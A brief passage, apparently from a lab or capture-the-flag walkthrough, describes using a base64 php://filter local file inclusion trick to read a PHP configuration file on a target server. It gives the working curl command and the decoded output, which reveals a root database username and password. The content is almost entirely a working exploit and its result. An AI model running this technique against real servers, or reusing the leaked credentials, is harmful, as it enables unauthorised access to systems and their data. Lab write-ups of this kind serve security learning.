We used Base64 encoded LFI attack to display the contents of any .php file without the server actually rendering them on the browser.

curl http://192.168.100.180/index.php?page=php://filter/convert.base64-encode/resource=config | base64 -d
<?php
$server	  = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>
